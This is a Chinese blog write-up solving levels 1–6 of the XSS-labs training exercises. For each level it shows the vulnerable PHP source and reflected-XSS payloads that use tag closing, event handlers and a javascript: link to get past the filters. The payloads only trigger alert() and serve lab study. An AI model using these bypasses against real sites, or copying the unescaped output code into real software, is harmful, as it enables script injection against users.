<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="XSS-labs通关笔记level 1 我们可以看到这里将name的参数值，插入到了 中，这里就是反射型xss，直接给name重新赋值。  服务器并没有进行任何的过滤，我们可以看看服务器端 服务器端源代码&lt;&#x2F;script&gt; &lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1 align&#x3D;cent">
<meta property="og:type" content="article">
<meta property="og:title" content="n3ym4r">
<meta property="og:url" content="http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="n3ym4r">
<meta property="og:description" content="XSS-labs通关笔记level 1 我们可以看到这里将name的参数值，插入到了 中，这里就是反射型xss，直接给name重新赋值。  服务器并没有进行任何的过滤，我们可以看看服务器端 服务器端源代码&lt;&#x2F;script&gt; &lt;title&gt;欢迎来到level1&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;h1 align&#x3D;cent">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911141228367.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143003578.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143415145.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911145010616.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911150558305.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911155344507.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911184437126.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911185059255.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911190554237.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191107302.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911191512274.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/2020072419061647.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dvNDFnZQ==,size_16,color_FFFFFF,t_70">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911203242098.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912135642044.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912140337047.png">
<meta property="og:image" content="http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/111">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912141605920.png">
<meta property="og:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220912142104313.png">
<meta property="article:published_time" content="2022-10-16T02:44:29.640Z">
<meta property="article:modified_time" content="2022-09-12T06:32:22.581Z">
<meta property="article:author" content="n3ym4r">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="c:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>n3ym4r</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/n3ym4r">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/10/15/hello-world/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/10/16/xss-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSS-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">XSS-labs通关笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#level-1"><span class="toc-number">1.1.</span> <span class="toc-text">level 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">1.2.</span> <span class="toc-text"> </span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">服务器端源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-2"><span class="toc-number">1.3.</span> <span class="toc-text">level 2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.3.0.1.</span> <span class="toc-text">服务器端源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-3"><span class="toc-number">1.4.</span> <span class="toc-text">level 3</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">1.4.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.4.0.2.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#htmlspecialchars"><span class="toc-number">1.4.0.3.</span> <span class="toc-text">htmlspecialchars ()</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-4"><span class="toc-number">1.5.</span> <span class="toc-text">level 4</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-1"><span class="toc-number">1.5.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-1"><span class="toc-number">1.5.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-5"><span class="toc-number">1.6.</span> <span class="toc-text">level 5</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-2"><span class="toc-number">1.6.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-2"><span class="toc-number">1.6.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-6"><span class="toc-number">1.7.</span> <span class="toc-text">level 6</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-3"><span class="toc-number">1.7.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-3"><span class="toc-number">1.7.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-7"><span class="toc-number">1.8.</span> <span class="toc-text">level 7</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-4"><span class="toc-number">1.8.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-4"><span class="toc-number">1.8.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-8"><span class="toc-number">1.9.</span> <span class="toc-text">level 8</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-5"><span class="toc-number">1.9.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-5"><span class="toc-number">1.9.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-9"><span class="toc-number">1.10.</span> <span class="toc-text">level 9</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-6"><span class="toc-number">1.10.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-6"><span class="toc-number">1.10.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-10"><span class="toc-number">1.11.</span> <span class="toc-text">level 10</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-7"><span class="toc-number">1.11.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-7"><span class="toc-number">1.11.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-11"><span class="toc-number">1.12.</span> <span class="toc-text">level 11</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-8"><span class="toc-number">1.12.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-8"><span class="toc-number">1.12.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-12"><span class="toc-number">1.13.</span> <span class="toc-text">level 12</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-9"><span class="toc-number">1.13.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-9"><span class="toc-number">1.13.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-13"><span class="toc-number">1.14.</span> <span class="toc-text">level 13</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-10"><span class="toc-number">1.14.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-10"><span class="toc-number">1.14.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-14"><span class="toc-number">1.15.</span> <span class="toc-text">level 14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-15"><span class="toc-number">1.16.</span> <span class="toc-text">level 15</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ng-include%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.16.0.1.</span> <span class="toc-text">ng-include相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-11"><span class="toc-number">1.16.0.2.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-11"><span class="toc-number">1.16.0.3.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-16"><span class="toc-number">1.17.</span> <span class="toc-text">level 16</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-12"><span class="toc-number">1.17.0.1.</span> <span class="toc-text">源代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-12"><span class="toc-number">1.17.0.2.</span> <span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-17"><span class="toc-number">1.18.</span> <span class="toc-text">level 17</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload-13"><span class="toc-number">1.18.0.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BA%90%E4%BB%A3%E7%A0%81-13"><span class="toc-number">1.18.0.2.</span> <span class="toc-text">源代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-18"><span class="toc-number">1.19.</span> <span class="toc-text">level 18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#level-19"><span class="toc-number">1.20.</span> <span class="toc-text">level 19</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">n3ym4r</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-10-16T02:44:29.640Z" itemprop="datePublished">2022-10-16</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="XSS-labs通关笔记"><a href="#XSS-labs通关笔记" class="headerlink" title="XSS-labs通关笔记"></a>XSS-labs通关笔记</h1><h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911140948713.png" alt="image-20220911140948713"></p>
<p>我们可以看到这里将name的参数值，插入到了<h2> </h2>中，这里就是反射型xss，直接给name重新赋值。</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911141228367.png" alt="image-20220911141228367"></p>
<p>服务器并没有进行任何的过滤，我们可以看看服务器端</p>
<h4 id="服务器端源代码"><a href="#服务器端源代码" class="headerlink" title="服务器端源代码"></a>服务器端源代码</h4><p><code>&lt;/script&gt;</code></p>
<p><code>&lt;title&gt;欢迎来到level1&lt;/title&gt;</code></p>
<p><code>&lt;/head&gt;</code></p>
<p><code>&lt;body&gt;</code></p>
<p><code>&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;name&quot;];</code>                                                         <strong>&#x2F;&#x2F;这里将name赋值给了str</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>       <strong>&#x2F;&#x2F;这里直接将str插入了标签之间,导致反射型xss形成</strong></p>
<p>**<code>?&gt;**</code></p>
<p><code>&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;/body&gt;</code></p>
<p><code>&lt;/html&gt;</code></p>
<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143003578.png" alt="image-20220911143003578"></p>
<p>可以发现，通过get传参提交，经过服务器的动态处理之后又会将参数keyword的值插入到<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中以及</p>
<p>添加到<code>&lt;input&gt;</code>标签中的value属性的值内。</p>
<p>我们尝试用上关的payload提交</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911143415145.png" alt="image-20220911143415145"></p>
<p>可以看到，在<code>&lt;h2&gt; &lt;/h2&gt;</code>标签之中的恶意代码被编码了，其中<code>&lt;</code>和<code>&gt;</code>都被编码成了html字符实体，猜测在服务器端用<code>htmlspecialchars()函数</code>对keyword参数的值进行了处理，接着往下看可以看到插入到value参数值中的恶意代码并没有被编码而是直接原样返回，但是问题是这里的js代码在标签属性值中，浏览器是无法执行的，既然上面的恶意代码被编码了，那么只能从属性值中的恶意代码处进行突破了。</p>
<p>要想浏览器执行这里的弹窗代码，只需要<strong>将属性的引号和标签先闭合</strong>就可以了</p>
<p>用”&gt;闭合前面的&lt;input，再用&#x2F;&#x2F;将后面的”注释掉。</p>
<p><strong>payload：</strong><code>n3ym4r&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//</code></p>
<h4 id="服务器端源代码-1"><a href="#服务器端源代码-1" class="headerlink" title="服务器端源代码"></a>服务器端源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code><strong>&#x2F;&#x2F;将get方式传递到服务器端的keyword参数的值赋给str变量</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p> <strong>&#x2F;&#x2F;用<code>htmlspecialchars()函数</code>对变量str进行处理之后显示到网页上</strong></p>
<p><code>&lt;form action=level2.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><strong>&#x2F;&#x2F;直接将变量值插入到了<code>&lt;input&gt;</code>标签的value属性值中</strong></p>
<p><code>&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p><code>&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;</code></p>
<p><code>&lt;?php</code> </p>
<p><code>echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>简单测试，发现与第二关相比，这里将属性值这里也进行了<code>htmlspecialchars()</code>函数处理。</p>
<p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911145010616.png" alt="image-20220911145010616"></p>
<p>这里，无法使用标签，因为标签都是带有&lt;&gt;符号的，就会被转义。但该函数不会转义单引号，可以采用<strong>事件</strong>闭合标签。</p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p> <code>&#39; onclick=&#39;alert(1)</code>&#x2F;&#x2F;当单击鼠标时运行脚本</p>
<p><code>&#39; onmouseover=&#39;alert(1)</code>&#x2F;&#x2F;当鼠标指针移至元素之上时运行脚本</p>
<h4 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;</code></p>
<p><code>&lt;form action=level3.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;</code>   </p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&quot;;</code></p>
<p><code>?&gt;</code></p>
<h4 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars ()"></a>htmlspecialchars ()</h4><p>将特殊字符转换为html实体</p>
<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p><img src="C:\Users\18754\AppData\Roaming\Typora\typora-user-images\image-20220911150558305.png" alt="image-20220911150558305"></p>
<p>可以看到&lt;&gt;符号被替换成了空</p>
<p>但是事件不需要用到&lt;&gt;，所以直接用<strong>鼠标事件</strong>插入</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p><code>&quot; onmouseover=&quot;alert(/xss/)</code></p>
<p>我们还是同样需要闭合他原来的语句。</p>
<h4 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</code> </p>
<p><code>$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</code><strong>&#x2F;&#x2F;将&lt;&gt;替换为空</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level4.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><h4 id="源代码-2"><a href="#源代码-2" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = strtolower($_GET[&quot;keyword&quot;]);</code></p>
<p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level5.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str3.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到将&lt;script替换为了&lt;scr_ipt,同时也将on替换为了o_n,这使得我们无法通过<code>&lt;script&gt;</code>标签或触发事件来执行js代码，那么我们可以换个标签，使用<strong>a标签的js伪协议实现href属性</strong>支持javascript:伪协议构造poc 产生一个链接</p>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><p><strong><code>&quot;&gt; &lt;a href=javascript:alert(&#39;xss&#39;) &gt; xss&lt;/a&gt; //</code></strong></p>
<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><h4 id="源代码-3"><a href="#源代码-3" class="headerlink" title="源代码"></a>源代码</h4><p><code>&lt;?php</code> </p>
<p><code>ini_set(&quot;display_errors&quot;, 0);</code></p>
<p><code>$str = $_GET[&quot;keyword&quot;];</code></p>
<p><code>$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</code><strong>&#x2F;&#x2F;限制&lt;script恶意代码</strong></p>
<p><code>$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</code><strong>&#x2F;&#x2F;限制带on的事件</strong></p>
<p><code>$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</code><strong>&#x2F;&#x2F;限制图片<img>标签，&lt;img src&#x3D;111 onerror&#x3D;alert(‘xss’)&gt;</strong></p>
<p><code>$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</code><strong>&#x2F;&#x2F;data:对字符编码的一种设定</strong></p>
<p><code>$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</code><strong>&#x2F;&#x2F;限制通过在href属性中插入js代码来点击执行</strong></p>
<p><code>echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&#39;&lt;center&gt;</code></p>
<p><code>&lt;form action=level6.php method=GET&gt;</code></p>
<p><code>&lt;input name=keyword  value=&quot;&#39;.$str6.&#39;&quot;&gt;</code></p>
<p><code>&lt;input type=submit name=submit value=搜索 /&gt;</code></p>
<p><code>&lt;/form&gt;</code></p>
<p><code>&lt;/center&gt;&#39;;</code></p>
<p><code>?&gt;</code></p>
<p>可以看到做了很多限制，但是都是判断的整个字符，我们可以<strong>大小写绕过</strong></p>
